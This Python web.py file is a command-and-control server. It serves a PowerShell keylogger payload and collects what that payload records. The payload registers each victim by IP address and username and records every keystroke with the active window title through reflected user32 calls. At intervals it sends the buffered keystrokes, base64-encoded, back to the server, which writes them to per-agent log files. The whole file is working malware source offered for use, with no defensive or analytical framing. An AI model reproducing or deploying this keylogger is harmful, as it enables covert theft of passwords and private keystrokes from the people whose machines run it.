import sys
import Global
import base64
from Colors import bcolors

sys.path.append(Global.MAINPATH)
from Lib import web

ghost = ''
gport = ''
class MyApplication(web.application):
    def run(self, port=8080, host='0.0.0.0', *middleware):
        func = self.wsgifunc(*middleware)
        return web.httpserver.runsimple(func, (host, port))

urls = (
	'/get_payload', 'get_payload',
	'/set_agent/(.*)','set_agent',
	'/set_log/','set_log'
	)

class get_payload:
	def GET(self):
		payload = '''
$server = 'http://{host}:{port}/'
$ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
$user 	= (whoami).split('\\')[1]
$id 	= $ip.ipaddress[0]+'.'+$user
write-host $id

if((New-Object Net.WebClient).DownloadString($server+'set_agent/'+$id) -eq 'true') {
write-host 'keylogging'
[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

try
{
	$ImportDll = [User32]
}
catch
{
	$DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
	$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
	$TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

	$DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
	$FieldArray = [Reflection.FieldInfo[]] @(
		[Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
		[Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
		[Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
		[Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
		[Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
		[Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
	)

	$PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
	$FieldValueArray = [Object[]] @(
		'GetAsyncKeyState',
		$True,
		$False,
		$True,
		[Runtime.InteropServices.CallingConvention]::Winapi,
		[Runtime.InteropServices.CharSet]::Auto
	)
	$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
	$PInvokeMethod.SetCustomAttribute($CustomAttribute)

	$PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
	$FieldValueArray = [Object[]] @(
		'GetKeyboardState',
		$True,
		$False,
		$True,
		[Runtime.InteropServices.CallingConvention]::Winapi,
		[Runtime.InteropServices.CharSet]::Auto
	)
	$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
	$PInvokeMethod.SetCustomAttribute($CustomAttribute)

	$PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
	$FieldValueArray = [Object[]] @(
		'MapVirtualKey',
		$False,
		$False,
		$True,
		[Runtime.InteropServices.CallingConvention]::Winapi,
		[Runtime.InteropServices.CharSet]::Auto
	)
	$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
	$PInvokeMethod.SetCustomAttribute($CustomAttribute)

	$PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
		[Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
	$FieldValueArray = [Object[]] @(
		'ToUnicode',
		$False,
		$False,
		$True,
		[Runtime.InteropServices.CallingConvention]::Winapi,
		[Runtime.InteropServices.CharSet]::Auto
	)
	$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
	$PInvokeMethod.SetCustomAttribute($CustomAttribute)

	$PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
	$FieldValueArray = [Object[]] @(
		'GetForegroundWindow',
		$True,
		$False,
		$True,
		[Runtime.InteropServices.CallingConvention]::Winapi,
		[Runtime.InteropServices.CharSet]::Auto
	)
	$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
	$PInvokeMethod.SetCustomAttribute($CustomAttribute)

	$ImportDll = $TypeBuilder.CreateType()
}

$LastWindowTitle = ""
$timer = 0
$buff = ''
while ($true) {
	Start-Sleep -Milliseconds 20
	$gotit = ""
	$Outout = ""
	
	for ($char = 1; $char -le 254; $char++) {
		$vkey = $char
		$gotit = $ImportDll::GetAsyncKeyState($vkey)
		
		if ($gotit -eq -32767) {

			#check for keys not mapped by virtual keyboard
			$LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
			$RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
			$LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
			$RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
			$LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
			$RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
			$TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
			$SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
			$DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
			$EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
			$BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
			$LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
			$RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
			$UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
			$DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
			$LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
			$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

			if ($LeftShift -or $RightShift) {$Outout += '[Shift]'}
			if ($LeftCtrl  -or $RightCtrl)  {$Outout += '[Ctrl]'}
			if ($LeftAlt   -or $RightAlt)   {$Outout += '[Alt]'}
			if ($TabKey)       {$Outout += '[Tab]'}
			if ($SpaceBar)     {$Outout += '[SpaceBar]'}
			if ($DeleteKey)    {$Outout += '[Delete]'}
			if ($EnterKey)     {$Outout += '[Enter]'}
			if ($BackSpaceKey) {$Outout += '[Backspace]'}
			if ($LeftArrow)    {$Outout += '[Left Arrow]'}
			if ($RightArrow)   {$Outout += '[Right Arrow]'}
			if ($UpArrow)      {$Outout += '[Up Arrow]'}
			if ($DownArrow)    {$Outout += '[Down Arrow]'}
			if ($LeftMouse)    {$Outout += '[Left Mouse]'}
			if ($RightMouse)   {$Outout += '[Right Mouse]'}

			#check for capslock
			if ([Console]::CapsLock) {$Outout += '[Caps Lock]'}

			$scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
			
			$kbstate = New-Object Byte[] 256
			$checkkbstate = $ImportDll::GetKeyboardState($kbstate)
			
			$mychar = New-Object -TypeName "System.Text.StringBuilder";
			$unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

			#get the title of the foreground window
			$TopWindow = $ImportDll::GetForegroundWindow()
			$WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
			
			if ($unicode_res -gt 0) {
				if ($WindowTitle -ne $LastWindowTitle){
					# if the window has changed
					$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
					$LastWindowTitle = $WindowTitle
				}
				$Outout += $mychar.ToString()
				$buff += $Outout
			}
		}
	}
	$timer++
	if($timer -gt 400) {
		$timer = 0
		$buff = $buff.Trim()
		if($buff.Length -gt 10) {
			if((New-Object Net.WebClient).DownloadString($server+'set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
				Exit
			}

			
		}
		$buff = ''
	}
}
}
'''
		return payload.replace('{host}',ghost).replace('{port}',gport)
class set_agent:
	def GET(self,id):
		if(id not in Global.AGENTS):
			Global.AGENTS.append(id)
			print '\n'+bcolors.OKGREEN + '[+] Agent Connected: ' + bcolors.ENDC + str(id)
			fp = open(Global.MAINPATH+'/../Output/'+id+'.txt','w')
			fp.write('Agent ID: '+id+'\n')
			fp.close()
			return 'true'
		return 'false'

class set_log:
	def GET(self):
		data 	= web.input()
		id 		= data.id
		string 	= data.string
		fp = open(Global.MAINPATH+'/../Output/'+id+'.txt','a')
		fp.write(base64.b64decode(string))
		fp.close()	
		return (id in Global.AGENTS)

def server(port,host):
	global gport, ghost
	gport = port
	ghost = host
	web.config.log_toprint = False
	app = MyApplication(urls, globals())
	app.run(port=int(port),host=host)
